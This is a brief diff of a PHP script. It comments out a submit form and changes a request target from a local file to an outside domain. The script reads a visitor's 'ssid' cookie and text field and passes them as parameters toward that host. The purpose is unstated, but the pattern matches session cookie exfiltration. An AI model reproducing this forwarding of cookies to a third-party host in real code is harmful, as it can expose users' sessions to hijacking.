@@ -1,10 +1,14 @@
+<?php
+
+/*
+?>
 <form action="" method="post">
   <input placeholder="ssid" name="ssid">
   <input placeholder="text" name="text">
   <button type="submit" name="button">Send</button>
 </form>
-
 <?php
+*/
 
 $ssid = $_COOKIE['ssid'];
 if ($ssid == '') {
@@ -15,7 +19,7 @@ if ($text == '') {
   $text = "empty";
 }
 
-$url = 'request_test.php';
+$url = 'bot.gexar.tk/request_test.php';
 $params = array(
   'ssid' => $ssid,
   'text' => $text,
